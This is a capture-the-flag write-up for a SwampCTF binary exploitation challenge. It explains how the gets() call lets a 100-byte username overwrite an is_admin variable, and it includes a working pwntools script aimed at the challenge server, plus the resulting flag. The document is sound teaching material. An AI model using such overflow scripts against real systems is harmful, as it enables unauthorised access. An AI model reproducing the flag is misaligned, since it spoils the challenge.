
When we run the binary we see that there is print flag option, but when we do that we get the we cannot get flag because we are not the admin
We can see in source code that `is_admin` variable is set to `0`. The program checks the `is_admin` variable during execution, if it is still 0, we are not the admin and we can print the flag
The thing is this program is using gets() function which dosent do bounds check and we can get overflow and we can overwrite local variables including `is_admin` variable

Also if we read the source code there is a comment 

```text
// I saw something online about this being vulnerable???
    // The blog I read said something about how a buffer overflow could corrupt other variables?!?
    // Eh whatever, It's probably safe to use here.
```

All we have to do is that when the program prompts us for our username, we supply it large size of data, lets say 100bytes which is lot more that allocated to us. Some of our input overwrites the `is_admin` variable and we get admin and then we can print the flag, lets do it.


```python
#!/usr/bin/env python3

from pwn import *

exe = './system_terminal'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

host,port = 'chals.swampctf.com',61230
#p = process(exe)

p = remote(host,port)

padding = 100

payload = flat(
    asm('nop')*padding,#padding to reach EIP
)

p.sendlineafter(b'Username:',payload)
p.recvuntil(b'>')
p.sendline(b'3')
p.interactive()
```

Run this and we get the flag, we also see that we were set admin

![[Pasted image 20240407233957.png]]

***flag : swampCTF{y0u_@r3_a_h@ck3r}***

